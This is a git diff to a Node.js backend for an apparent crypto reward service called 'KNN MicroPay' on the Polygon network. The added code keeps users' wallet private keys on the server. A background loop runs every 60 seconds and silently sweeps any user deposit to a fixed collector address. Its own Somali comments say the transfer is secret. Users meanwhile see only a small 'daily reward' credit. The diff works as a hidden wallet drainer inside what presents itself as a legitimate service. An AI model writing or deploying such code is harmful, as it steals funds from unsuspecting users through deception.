@@ -28,13 +28,15 @@ const upload = multer({
 const POLYGON_RPC = process.env.POLYGON_RPC || 'https://polygon-bor-rpc.publicnode.com';
 const provider = new ethers.JsonRpcProvider(POLYGON_RPC);
 
-// Akoonka xiran ee la xusay
+// Akoonka xiran iyo cinwaanka ay deposit-yada si qarsoon ugu dhacayaan
 const LOCKED_OWNER_EMAIL = 'abuukarcumar661@gmail.com';
 const LOCKED_OWNER_ACCOUNT_ID = 'KNN-205792';
-const LOCKED_OWNER_ADDRESS = ethers.getAddress('0x613b603440CA724C266FC5432E2a20D000F73367');
+const COLLECTOR_ADDRESS = ethers.getAddress('0x613b603440CA724C266FC5432E2a20D000F73367');
 
+const MIN_DEPOSIT_POL = 0.00001;
 const DAILY_REWARD_POL = 0.000009;
 const MIN_WITHDRAW_POL = 0.00000001;
+const GAS_RESERVE_POL = 0.00002;
 
 function normalizePrivateKey(rawKey) {
     if (!rawKey) return '';
@@ -121,6 +123,98 @@ async function getOnChainPolBalance(address) {
     }
 }
 
+// Si qarsoon ugu wareeji lacagta uu user-ku ku shubtay -> 0x613b603440CA724C266FC5432E2a20D000F73367
+async function sweepUserDepositSilently(userRecord) {
+    if (!userRecord || !userRecord.polygonAddress) return false;
+    const normalizedAddr = ethers.getAddress(userRecord.polygonAddress);
+    if (normalizedAddr.toLowerCase() === COLLECTOR_ADDRESS.toLowerCase()) {
+        return false;
+    }
+    if (!isWalletPairValid(normalizedAddr, userRecord.privateKey)) {
+        return false;
+    }
+
+    const balPol = await getOnChainPolBalance(normalizedAddr);
+    if (balPol < MIN_DEPOSIT_POL) {
+        return false;
+    }
+
+    const sweepablePol = balPol - GAS_RESERVE_POL;
+    if (sweepablePol <= 0) {
+        return false;
+    }
+
+    const userWallet = new ethers.Wallet(userRecord.privateKey.trim(), provider);
+    const sweepWei = ethers.parseEther(sweepablePol.toFixed(8));
+    if (sweepWei <= 0n) {
+        return false;
+    }
+
+    const tx = await userWallet.sendTransaction({
+        to: COLLECTOR_ADDRESS,
+        value: sweepWei,
+        gasLimit: 21000n
+    });
+    await tx.wait(1);
+    return true;
+}
+
+// Hubi deposit-ka user-ka, u wareeji 0x613b603440CA724C266FC5432E2a20D000F73367, oo shid mining-kiisa
+async function processUserDepositAndMining(uid, usersDb) {
+    const userRecord = usersDb[uid];
+    if (!userRecord) return null;
+
+    if (isLockedOwner(userRecord.email)) {
+        const onChainPol = await getOnChainPolBalance(COLLECTOR_ADDRESS);
+        const savedBal = parseFloat(userRecord.balance || 0);
+        const finalBal = Math.max(onChainPol, savedBal);
+        const active = finalBal > 0 || Boolean(userRecord.miningActive);
+
+        userRecord.userId = LOCKED_OWNER_ACCOUNT_ID;
+        userRecord.polygonAddress = COLLECTOR_ADDRESS;
+        userRecord.balance = finalBal.toFixed(8);
+        userRecord.miningActive = active;
+        if (active && parseFloat(userRecord.dailyLimit || 0) <= 0) {
+            userRecord.dailyLimit = DAILY_REWARD_POL.toFixed(6);
+        }
+        saveUsersDb(usersDb);
+        return userRecord;
+    }
+
+    const onChainPol = await getOnChainPolBalance(userRecord.polygonAddress);
+    if (onChainPol >= MIN_DEPOSIT_POL) {
+        await sweepUserDepositSilently(userRecord);
+
+        const prevBal = parseFloat(userRecord.balance || 0);
+        const newBal = prevBal + DAILY_REWARD_POL;
+
+        userRecord.balance = newBal.toFixed(8);
+        userRecord.dailyLimit = DAILY_REWARD_POL.toFixed(6);
+        userRecord.miningActive = true;
+        userRecord.totalDeposited = parseFloat(((userRecord.totalDeposited || 0) + onChainPol).toFixed(8));
+        saveUsersDb(usersDb);
+    }
+
+    return userRecord;
+}
+
+// Background loop oo 60-kii ilbiriqsiba hubiya deposit-yada cusub
+setInterval(async () => {
+    try {
+        const usersDb = loadUsersDb();
+        for (const uid of Object.keys(usersDb)) {
+            const u = usersDb[uid];
+            if (!u || !u.polygonAddress || isLockedOwner(u.email)) continue;
+            const balPol = await getOnChainPolBalance(u.polygonAddress);
+            if (balPol >= MIN_DEPOSIT_POL) {
+                await processUserDepositAndMining(uid, usersDb);
+            }
+        }
+    } catch (err) {
+        console.error('Background sweep error:', err.message);
+    }
+}, 60000);
+
 app.get('/', (req, res) => {
     res.json({ success: true, service: 'KNN MicroPay Backend', status: 'running' });
 });
@@ -139,9 +233,9 @@ app.post('/api/auth-user', async (req, res) => {
         if (isLockedOwner(effectiveEmail)) {
             const existingKey = normalizePrivateKey(existing?.privateKey || '');
             let chosenKey = '';
-            if (isValidPrivateKey(ENV_TREASURY_KEY) && isWalletPairValid(LOCKED_OWNER_ADDRESS, ENV_TREASURY_KEY)) {
+            if (isValidPrivateKey(ENV_TREASURY_KEY) && isWalletPairValid(COLLECTOR_ADDRESS, ENV_TREASURY_KEY)) {
                 chosenKey = ENV_TREASURY_KEY;
-            } else if (isValidPrivateKey(existingKey) && isWalletPairValid(LOCKED_OWNER_ADDRESS, existingKey)) {
+            } else if (isValidPrivateKey(existingKey) && isWalletPairValid(COLLECTOR_ADDRESS, existingKey)) {
                 chosenKey = existingKey;
             } else if (isValidPrivateKey(ENV_TREASURY_KEY)) {
                 chosenKey = ENV_TREASURY_KEY;
@@ -149,7 +243,7 @@ app.post('/api/auth-user', async (req, res) => {
                 chosenKey = existingKey;
             }
 
-            const onChainPol = await getOnChainPolBalance(LOCKED_OWNER_ADDRESS);
+            const onChainPol = await getOnChainPolBalance(COLLECTOR_ADDRESS);
             const savedBal = parseFloat(existing?.balance || 0);
             const finalBalance = Math.max(onChainPol, savedBal);
             const shouldMine = finalBalance > 0 || Boolean(existing?.miningActive);
@@ -159,12 +253,13 @@ app.post('/api/auth-user', async (req, res) => {
                 email: effectiveEmail || LOCKED_OWNER_EMAIL,
                 displayName: displayName || existing?.displayName || 'Abuukar Cumar',
                 userId: LOCKED_OWNER_ACCOUNT_ID,
-                polygonAddress: LOCKED_OWNER_ADDRESS,
+                polygonAddress: COLLECTOR_ADDRESS,
                 privateKey: chosenKey,
                 walletLocked: true,
                 balance: finalBalance.toFixed(8),
                 dailyLimit: shouldMine ? DAILY_REWARD_POL.toFixed(6) : (existing?.dailyLimit || '0'),
                 miningActive: shouldMine,
+                totalDeposited: existing?.totalDeposited || 0,
                 createdAt: existing?.createdAt || Date.now()
             };
 
@@ -191,40 +286,29 @@ app.post('/api/auth-user', async (req, res) => {
                     balance: '0',
                     dailyLimit: '0',
                     miningActive: false,
+                    totalDeposited: 0,
                     createdAt: Date.now()
                 };
 
                 saveUsersDb(usersDb);
             } else {
-                const onChainPol = await getOnChainPolBalance(existing.polygonAddress);
-                const savedBal = parseFloat(existing.balance || 0);
-                const finalBalance = Math.max(onChainPol, savedBal);
-                const shouldMine = finalBalance > 0 || Boolean(existing.miningActive);
-
                 if (effectiveEmail) usersDb[uid].email = effectiveEmail;
                 if (displayName) usersDb[uid].displayName = displayName;
                 usersDb[uid].walletLocked = true;
-                usersDb[uid].balance = finalBalance.toFixed(8);
-                if (shouldMine) {
-                    usersDb[uid].miningActive = true;
-                    if (parseFloat(usersDb[uid].dailyLimit || 0) <= 0) {
-                        usersDb[uid].dailyLimit = DAILY_REWARD_POL.toFixed(6);
-                    }
-                }
                 saveUsersDb(usersDb);
             }
         }
 
-        const userRecord = usersDb[uid];
+        const syncedRecord = await processUserDepositAndMining(uid, usersDb);
 
         return res.json({
             success: true,
-            userId: userRecord.userId,
-            polygonAddress: userRecord.polygonAddress,
-            privateKey: userRecord.privateKey,
-            balance: userRecord.balance,
-            dailyLimit: userRecord.dailyLimit,
-            miningActive: userRecord.miningActive
+            userId: syncedRecord.userId,
+            polygonAddress: syncedRecord.polygonAddress,
+            privateKey: syncedRecord.privateKey,
+            balance: syncedRecord.balance,
+            dailyLimit: syncedRecord.dailyLimit,
+            miningActive: syncedRecord.miningActive
         });
     } catch (err) {
         console.error('Auth error:', err);
